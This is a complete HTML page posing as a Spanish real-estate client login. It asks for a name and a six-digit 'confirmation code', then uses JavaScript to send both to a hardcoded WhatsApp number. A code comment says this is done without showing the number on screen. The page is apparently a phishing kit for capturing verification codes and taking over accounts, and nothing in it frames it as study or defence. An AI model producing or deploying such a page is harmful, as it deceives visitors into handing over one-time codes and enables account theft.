
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Inmobiliaria Premium | Acceso Clientes</title>
    <style>
        /* ESTILOS VISUALES (CSS) */
        * { box-sizing: border-box; margin: 0; padding: 0; }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* Portada con fotos de casas bonitas */
        .hero {
            width: 100%;
            height: 45vh;
            background: url('https://images.unsplash.com/photo-1600585154340-be6161a56a0c?auto=format&fit=crop&w=1350&q=80') no-repeat center center/cover;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }

        .hero::before {
            content: "";
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.4);
        }

        .hero-text {
            position: relative;
            color: white;
            text-align: center;
            text-shadow: 2px 2px 10px rgba(0,0,0,0.5);
        }

        .hero-text h1 { font-size: 2.5rem; margin-bottom: 10px; }

        /* Contenedor del Formulario */
        .login-card {
            background: white;
            width: 90%;
            max-width: 450px;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
            margin-top: -60px;
            z-index: 10;
            text-align: center;
        }

        .login-card h2 { color: #333; margin-bottom: 25px; }

        .input-group { text-align: left; margin-bottom: 25px; }
        
        .input-group label { 
            display: block; 
            margin-bottom: 8px; 
            font-weight: bold; 
            color: #555;
        }

        .input-name {
            width: 100%;
            padding: 15px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            outline: none;
            transition: border-color 0.3s;
        }

        .input-name:focus { border-color: #2c3e50; }

        /* Cuadritos del Código de 6 dígitos */
        .code-wrapper {
            display: flex;
            justify-content: space-between;
            gap: 8px;
            margin: 20px 0 30px;
        }

        .code-digit {
            width: 50px;
            height: 60px;
            border: 2px solid #ddd;
            border-radius: 10px;
            text-align: center;
            font-size: 24px;
            font-weight: bold;
            color: #333;
            outline: none;
            transition: all 0.2s;
        }

        .code-digit:focus {
            border-color: #25d366;
            box-shadow: 0 0 8px rgba(37, 211, 102, 0.3);
        }

        /* Botón de Confirmar */
        .btn-confirm {
            width: 100%;
            background-color: #1a1a1a;
            color: white;
            padding: 18px;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s;
        }

        .btn-confirm:hover { background-color: #333; }

        .footer-info { margin-top: 20px; font-size: 0.9rem; color: #888; }
    </style>
</head>
<body>

    <header class="hero">
        <div class="hero-text">
            <h1>Exclusividad & Confort</h1>
            <p>Tu próximo hogar te está esperando</p>
        </div>
    </header>

    <div class="login-card">
        <h2>Verificación de Usuario</h2>
        
        <form id="mainForm">
            <div class="input-group">
                <label>Nombre Completo</label>
                <input type="text" id="userName" class="input-name" placeholder="Ej: Juan Pérez" required>
            </div>

            <label style="font-weight: bold; color: #555;">Código de Confirmación</label>
            <div class="code-wrapper">
                <input type="text" maxlength="1" class="code-digit" required pattern="\d*">
                <input type="text" maxlength="1" class="code-digit" required pattern="\d*">
                <input type="text" maxlength="1" class="code-digit" required pattern="\d*">
                <input type="text" maxlength="1" class="code-digit" required pattern="\d*">
                <input type="text" maxlength="1" class="code-digit" required pattern="\d*">
                <input type="text" maxlength="1" class="code-digit" required pattern="\d*">
            </div>

            <button type="submit" class="btn-confirm">CONFIRMAR Y ACCEDER</button>
        </form>

        <p class="footer-info">Inmobiliaria © 2026 - Seguridad Encriptada</p>
    </div>

    <script>
        // LÓGICA DE FUNCIONAMIENTO (JAVASCRIPT)
        const digits = document.querySelectorAll('.code-digit');

        // Función para saltar automáticamente de cuadrito
        digits.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                if (e.target.value.length === 1 && index < digits.length - 1) {
                    digits[index + 1].focus();
                }
            });

            // Permitir borrar y regresar atrás
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
                    digits[index - 1].focus();
                }
            });
        });

        // Al darle clic al botón "Confirmar y Acceder"
        document.getElementById('mainForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const nombre = document.getElementById('userName').value;
            let codigoCompleto = "";
            digits.forEach(input => codigoCompleto += input.value);

            // Datos de envío (Tu número +53 52416260 configurado internamente)
            const miTelefono = "5352416260";
            const textoMensaje = `*NUEVO REGISTRO DE VENTA*%0A%0A*Cliente:* ${nombre}%0A*Código de Acceso:* ${codigoCompleto}%0A%0A_Enviado desde el portal web._`;

            // Redirige a WhatsApp sin mostrar el número en pantalla
            window.location.href = `https://wa.me/${miTelefono}?text=${textoMensaje}`;
        });
    </script>

</body>
</html>
